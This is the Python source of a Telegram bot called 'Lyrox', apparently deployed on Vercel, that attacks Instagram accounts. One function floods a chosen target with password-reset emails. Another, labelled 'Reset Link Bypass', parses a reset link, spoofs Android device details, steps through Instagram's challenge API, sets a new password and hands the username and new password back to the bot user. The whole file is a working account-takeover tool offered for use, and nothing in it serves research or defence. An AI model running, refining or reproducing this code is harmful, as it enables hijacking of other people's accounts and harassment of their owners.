import os
import sys
import json
import time
import random
import string
import uuid
from datetime import datetime
from hashlib import md5
import base64
import secrets
from bs4 import BeautifulSoup
import httpx
import requests
from user_agent import generate_user_agent
import re
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import telebot
from telebot import types
from flask import Flask, request

# ==========================================
# 1. BOT & FLASK CONFIGURATION
# ==========================================

# Vercel is serverless, so we initialize Flask and Bot here
app = Flask(__name__)

# Replace hardcoded tokens with Environment Variable
TOKEN = os.getenv('BOT_TOKEN')
# threaded=False is important for serverless stability
bot = telebot.TeleBot(TOKEN, threaded=False)

# ==========================================
# 2. ORIGINAL SCRIPT LOGIC (100% RETAINED)
# ==========================================

banner = render('Lyrox', colors=['white', 'blue'], align='center')

MESSAGES = {
    'ask_link': "🔗 <b>Please provide the Instagram Reset Link:</b>",
    'processing': "⌛ <b>Processing request... Please wait.</b>",
    'success_auto': "✅ <b>Password Changed Successfully!</b>\n\n👤 <b>Username:</b> <code>{}</code>\n🔑 <b>New Password:</b> <code>{}</code>",
    'fail_auto': "❌ <b>Operation failed:</b> {}",
    'send_code_success': "✅ <b>Reset Link Sent!</b>\n\n📩 <b>Sent to:</b> <code>{}</code>\n\n<i>Note: If you don't see it, check your Spam folder.</i>",
    'send_code_fail': "❌ <b>Instagram Error:</b> Email or Username not found.",
    'send_code_error': "❌ <b>Technical Error:</b> {}",
    'select_option': "<b>Lyrox Bot Control Panel</b>\n<i>Choose an automated service below:</i>",
    'option_1': "📧 Reset Email Sender",
    'option_2': "🔓 Reset Link Bypass",
    'enter_email_username': "📩 <b>Enter the Target Email or Username:</b>"
}

def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:@Random.{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def acer(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
        r = requests.get(url, headers=headers)
        return r.json()["user"]["username"]
    except:
        return None

def purna(reset_link):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
        token = reset_link.split("&token=")[1].split(":")[0]

        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        r = requests.post(url, headers=acer(user_agent=USER_AGENT), data=data)
        
        if "user_id" not in r.text:
            return {"success": False, "error": f"Invalid or Expired Link: {r.text}"}

        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        r2 = requests.post(url2, headers=acer(mid, USER_AGENT), data=data2).text
        
        challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        requests.post(url2, headers=acer(mid, USER_AGENT), data=data3)
        new_password = PASSWORD.split(":")[-1]
        
        username = id_user(user_id)
        return {
            "success": True,
            "password": new_password,
            "user_id": user_id,
            "username": username
        }
    except Exception as e:
        return {"success": False, "error": str(e)}

def send_code_core(user):
    try:
        with httpx.Client(http2=True, timeout=20, follow_redirects=True) as client:
            gen_ua = generate_user_agent()
            pre_headers = {
                "user-agent": gen_ua,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.5"
            }
            client.get("https://www.instagram.com/accounts/password/reset/", headers=pre_headers)
            csrftoken = client.cookies.get('csrftoken', 'missing')
            ajax_headers = {
                "user-agent": gen_ua,
                "x-ig-app-id": "936619743392459",
                "x-requested-with": "XMLHttpRequest",
                "x-csrftoken": csrftoken,
                "x-asbd-id": "359341",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/accounts/password/reset/",
                "content-type": "application/x-www-form-urlencoded"
            }
            payload = {"email_or_username": user}
            r = client.post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data=payload, headers=ajax_headers)
            response_data = r.json()
            contact_point = response_data.get('contact_point')
            if response_data.get('status') == 'ok' and contact_point:
                return True, MESSAGES['send_code_success'].format(contact_point)
            else:
                return False, MESSAGES['send_code_fail']
    except Exception as e:
        return False, MESSAGES['send_code_error'].format(str(e))

# ==========================================
# 3. TELEGRAM BOT HANDLERS
# ==========================================

def get_main_menu_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    button_email = types.InlineKeyboardButton(MESSAGES['option_1'], callback_data="action_email")
    button_bypass = types.InlineKeyboardButton(MESSAGES['option_2'], callback_data="action_bypass")
    markup.add(button_email, button_bypass)
    return markup

@bot.message_handler(commands=['start'])
def handle_start(message):
    bot.send_message(
        message.chat.id, 
        f"<code>{banner}</code>\n{MESSAGES['select_option']}\n\n<b>Developer:</b> @b44ner", 
        parse_mode='HTML', 
        reply_markup=get_main_menu_keyboard()
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    if call.data == "action_email":
        msg = bot.send_message(call.message.chat.id, MESSAGES['enter_email_username'], parse_mode='HTML')
        bot.register_next_step_handler(msg, step_execute_email)
    
    elif call.data == "action_bypass":
        msg = bot.send_message(call.message.chat.id, MESSAGES['ask_link'], parse_mode='HTML')
        bot.register_next_step_handler(msg, step_execute_bypass)

def step_execute_email(message):
    target_user = message.text.strip()
    bot.send_message(message.chat.id, MESSAGES['processing'], parse_mode='HTML')
    success, feedback = send_code_core(target_user)
    bot.send_message(message.chat.id, feedback, parse_mode='HTML', reply_markup=get_main_menu_keyboard())

def step_execute_bypass(message):
    link_input = message.text.strip()
    if "http" not in link_input or "uidb36" not in link_input:
        bot.send_message(message.chat.id, "❌ <b>Invalid Reset Link!</b>", parse_mode='HTML', reply_markup=get_main_menu_keyboard())
        return
    bot.send_message(message.chat.id, MESSAGES['processing'], parse_mode='HTML')
    result = purna(link_input)
    if result.get('success'):
        formatted_success = MESSAGES['success_auto'].format(result.get('username', 'Unknown'), result.get('password', 'Error'))
        bot.send_message(message.chat.id, formatted_success, parse_mode='HTML', reply_markup=get_main_menu_keyboard())
    else:
        error_text = MESSAGES['fail_auto'].format(result.get('error', 'Error'))
        bot.send_message(message.chat.id, error_text, parse_mode='HTML', reply_markup=get_main_menu_keyboard())

# ==========================================
# 4. VERCEL WEBHOOK ROUTE
# ==========================================

@app.route('/api/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    else:
        return 'Forbidden', 403

@app.route('/')
def index():
    return "Lyrox Bot is Online"
